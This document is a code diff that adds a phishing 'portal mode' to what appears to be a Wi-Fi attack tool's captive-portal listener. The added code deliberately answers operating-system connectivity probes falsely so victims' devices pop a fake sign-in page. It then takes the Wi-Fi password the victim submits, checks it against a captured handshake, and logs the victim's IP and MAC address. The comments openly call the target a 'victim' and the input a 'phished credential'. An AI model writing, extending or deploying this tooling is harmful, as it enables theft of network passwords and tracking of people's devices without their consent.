@@ -87,6 +87,14 @@ class CaptiveSentinelService:
         self._recent: list[dict[str, Any]] = self._load_persisted()
         # Bound address — overridden by start() based on stub flag
         self._bound: tuple[str, int] | None = None
+        # Portal / "lie" mode (S12.5). When on, the listener stops
+        # answering OS probes truthfully and instead serves the captive-
+        # portal landing page so the victim's OS pops its captive browser.
+        # ``_portal`` is the CaptivePortalService instance (passed in so
+        # the request handler — which runs outside any Flask app context —
+        # doesn't need current_app).
+        self._portal_mode = False
+        self._portal: Any = None
 
     # ---------- Persistence ----------
     def _load_persisted(self) -> list[dict[str, Any]]:
@@ -152,6 +160,20 @@ class CaptiveSentinelService:
             log.exception("captive sentinel shutdown failed")
         return True, "stopped"
 
+    def set_portal_mode(self, on: bool, *, portal: Any = None) -> None:
+        """Switch the listener between truthful sentinel (S11) and portal
+        mode (S12.5). ``portal`` is the CaptivePortalService instance the
+        handler uses to render the page + verify submitted PSKs — passed
+        explicitly so the handler threads don't need a Flask app context."""
+        with self._lock:
+            self._portal_mode = bool(on)
+            if portal is not None:
+                self._portal = portal
+        log.info("captive sentinel portal mode: %s", "ON" if on else "off")
+
+    def portal_mode(self) -> bool:
+        return self._portal_mode
+
     def is_running(self) -> bool:
         return self._server is not None
 
@@ -206,6 +228,27 @@ class _SentinelHandler(BaseHTTPRequestHandler):
                 continue
         return None
 
+    # ---------- Portal mode helpers (S12.5) ----------
+    def _portal_active(self):
+        """Return the CaptivePortalService iff portal mode is on AND the
+        portal is armed; else None (fall back to truthful sentinel)."""
+        svc = self.sentinel_service
+        if not (svc and svc._portal_mode and svc._portal):
+            return None
+        try:
+            return svc._portal if svc._portal.is_portal_active() else None
+        except Exception:
+            return None
+
+    def _send_html(self, body: str, status: int = 200) -> None:
+        data = body.encode("utf-8")
+        self.send_response(status)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(data)
+
     def do_GET(self) -> None:  # noqa: N802 (stdlib spec)
         svc = self.sentinel_service
         path_lc = (self.path or "/").lower().split("?", 1)[0]
@@ -214,6 +257,24 @@ class _SentinelHandler(BaseHTTPRequestHandler):
         client_ip = self.client_address[0] if self.client_address else ""
         ua = self.headers.get("User-Agent", "")
         mac = self._resolve_mac(client_ip) if svc else None
+
+        # ---- Portal mode: serve the landing page for everything ----
+        # Answering an OS probe path with our HTML instead of the expected
+        # success token is exactly what makes the OS decide it's behind a
+        # captive portal and pop the CNA / sign-in browser, which then
+        # loads this same page. So in portal mode every GET returns the
+        # landing page.
+        portal = self._portal_active()
+        if portal is not None:
+            if svc:
+                svc.record({
+                    "ts": time.time(), "client_ip": client_ip,
+                    "client_mac": mac, "path": self.path,
+                    "user_agent": ua, "matched": True, "label": "portal",
+                })
+            log.info("captive portal GET %s %s ua=%r", client_ip, self.path, ua[:60])
+            self._send_html(portal.get_portal_html())
+            return
 
         probe = {
             "ts":         time.time(),
@@ -245,6 +306,42 @@ class _SentinelHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.send_header("Content-Length", "0")
             self.end_headers()
+
+    def do_POST(self) -> None:  # noqa: N802 (stdlib spec)
+        """Handle the phished-credential submit. Only meaningful in portal
+        mode; otherwise 404. Parses the urlencoded ``psk`` field, hands it
+        to the captive-portal service (which verifies it against the
+        captured handshake), and renders the response the verify mode
+        dictates (success page, or the form again with an error)."""
+        from urllib.parse import parse_qs
+
+        portal = self._portal_active()
+        if portal is None:
+            self.send_response(404)
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+            return
+
+        client_ip = self.client_address[0] if self.client_address else ""
+        mac = self._resolve_mac(client_ip)
+        try:
+            length = int(self.headers.get("Content-Length", "0"))
+        except (TypeError, ValueError):
+            length = 0
+        raw = self.rfile.read(length) if length > 0 else b""
+        fields = parse_qs(raw.decode("utf-8", errors="replace"))
+        psk = (fields.get("psk") or [""])[0]
+
+        result = portal.submit_credential(
+            psk, client_ip=client_ip, client_mac=mac)
+        log.info("captive portal POST %s psk-len=%d verified=%s mode-msg=%s",
+                 client_ip, len(psk), result.get("verified"), result.get("message"))
+
+        if result.get("message") == "success":
+            self._send_html(portal.success_html())
+        else:
+            # retry — re-show the landing page with the error banner
+            self._send_html(portal.get_portal_html(error=True))
 
 
 # ---------- Module singleton ----------
